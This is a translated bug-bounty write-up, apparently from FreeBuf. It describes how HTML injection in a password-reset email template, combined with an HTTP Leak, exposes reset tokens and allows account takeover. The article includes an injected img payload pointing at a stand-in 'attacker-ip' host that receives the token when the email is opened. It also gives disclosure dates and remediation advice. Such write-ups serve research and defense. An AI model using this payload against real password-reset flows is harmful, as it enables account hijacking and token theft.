***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![通过密码重置功能构造HTTP
Leak实现任意账户劫持](https://image.3001.net/images/20190412/1555046329_5cb01fb9f28e6.jpg!small)**
**本文分享的是，作者在参与某次漏洞邀请测试项目中，发现目标应用服务的密码重置请求存在HTML注入漏洞（HTML injection），通过进一步的HTTP
Leak攻击构造，获取到账户的密码重置Token，以此间接实现任意账户劫持。（出于保密原则，文中涉及到的目标应用服务用app.com代替）。**

## 密码重置请求中的HTML注入

在针对目标应用服务的密码重置功能测试过程中，我发现在服务端和我的重置密码测试账户之间存在以下POST请求，即它会自动向重置密码的用户邮箱发送以下邮件，提醒用户点击相应的重置链接[RESET
LINK]去修改密码，该请求是一个HTML邮件格式：

![通过密码重置功能构造HTTP
Leak实现任意账户劫持](https://image.3001.net/images/20190412/1555044791_5cb019b759208.png!small)仔细看，可以发现，其中的emailBody使用的是模板样式，所以，接下来，我们就来看看这里它能不能被利用，能否向其中注入一些东西。因此，我在其中插入了一个<a>标签内容，如下：

![通过密码重置功能构造HTTP
Leak实现任意账户劫持](https://image.3001.net/images/20190412/1555044820_5cb019d49c0ce.png!small)这样一来，在我的重置密码测试用户邮箱中，收到了以下邮件，注意看，在我新添加的click之后，是密码重置需要点击的密码修改链接，也就是POST请求中的[RESET-LINK]：  
![通过密码重置功能构造HTTP
Leak实现任意账户劫持](https://image.3001.net/images/20190412/1555044846_5cb019ee21703.jpeg!small)很明显，目标应用服务未对HTML邮件模板的用户输入做安全过滤，导致emailBody元素可被攻击者控制，这是一种典型的HTML注入漏洞。但在这里，能产生什么影响呢?
此时，我突然想到了HTTP Leak攻击方法，可以用这种方式来看看是否存在相关的信息泄露，或许能在其中获取到对应账户的密码重置Token。

## HTTP Leak攻击简介

当前Web技术下包含了大量HTML元素和属性，这些HTML元素和属性会请求一些外部资源，而在它们的HTTP请求过程中，可能存在潜在的敏感信息泄露。为此，德国著名网络安全公司Cure53发起了名为HTTP
Leaks的攻击方法研究项目（项目参见[Github
-HttpLeaks](https://github.com/cure53/HTTPLeaks)），其攻击方法目的在于，枚举出各类HTTP请求中可能存在的信息泄露问题。

另外，某些场景下，还能利用HTTP Leak绕过CSP防护机制，如@filedescriptor的《[CSP
2015](https://blog.innerht.ml/csp-2015/)》，以及@intidc大神的《[HTML injection can
lead to data theft](https://hackerone.com/reports/110578)》。

就比如，在HTTP请求涉及的一些HTML邮件格式中，如果存在HTTP
Leak问题，那么，可以利用它来知道收信人是否打开或者阅读了邮件；还有一些Web代理工具，它们声称可以用“匿名”的方式去访问某些网站，但一些HTML元素或属性的重写过程中，就会涉及到外部资源的HTTP请求，如果这其中存在信息泄露问题，那么，其声称的“匿名”保护也就无从谈起了。

## 构造HTTP Leak攻击Payload

在此，我们需要了解HTML邮件格式模板（可[点此查看](https://docs.snipcart.com/email-templates/forgot-password)Email Templates），其中的密码重置请求模板如下：

    
    
    ---    Subject: Retrieve your password on {{ settings.businessAddress.company }}.
    ---    <!DOCTYPE html>
    <html>
    <head>
    </head>
    <body style="font-family: Arial; font-size: 12px;">
    <div>
        <p>
            You have requested a password reset, please follow the link below to reset your password.
        </p>
        <p>
            Please ignore this email if you did not request a password change.
        </p>
        <p>
            <a href="{{ RESET-LINK }}">
                Follow this link to reset your password.
            </a>
        </p>
    </div>
    </body>
    </html>

结合前述密码重置请求的HTML邮件格式注入漏洞，我们可以在[RESE-TLINK]之前插入以下格式的Payload：

> <img src=\"<http://attacker-ip/?id=>

注意看，这种插入最后就形成了：

> <img src=\"<http://attacker-ip/?id=>"{{ RESET-LINK }}"

其中，第一对双引号的闭合区间 **"<http://attacker-ip/?id=>"**
成为了最终的密码重置点击链接，也就是说，受害者收到密码重置请求邮件后，他点击的密码重置链接将会是攻击者控制的网站<http://attacker-ip/>，这样一来，目标应用产生的密码重置token就会发送到攻击者控制的网站<http://attacker-ip/>。

这里，由于插入的<img src=\"<http://attacker-ip/?id=>
伪装成一张图片元素，所以，实际上，只要受害者打开密码重置请求邮件，不需要点击其中的重置链接，当邮件体发起图片加载时，就能自动请求攻击者网站，实现密码重置token向<http://attacker-ip/>的发送，如下：

## ![通过密码重置功能构造HTTP
Leak实现任意账户劫持](https://image.3001.net/images/20190412/1555045141_5cb01b156f8c7.jpeg!small)漏洞影响

获得了其他账户的密码重置token，那么就可以间接操作，实现对其他账户的劫持了。目前，就从我的测试来看，除Gmail
和Yahoo外，有很多主流的邮件服务商大多都存在这种HTML注入+HTTP
Leak的问题，从防护层面来说，需要对HTML邮件模板的用户可输入和编辑功能进行安全过滤检查。

> 2019.1.8 漏洞上报
>
> 2019.1.10 漏洞分类修复
>
> 2019.1.10 漏洞赏金发放

 ***参考来源：[medium](https://medium.com/@mrnikhilsri/unauthenticated-account-takeover-through-http-leak-33386bb0ba0b)，clouds编译，转载请注明来自FreeBuf.COM**  

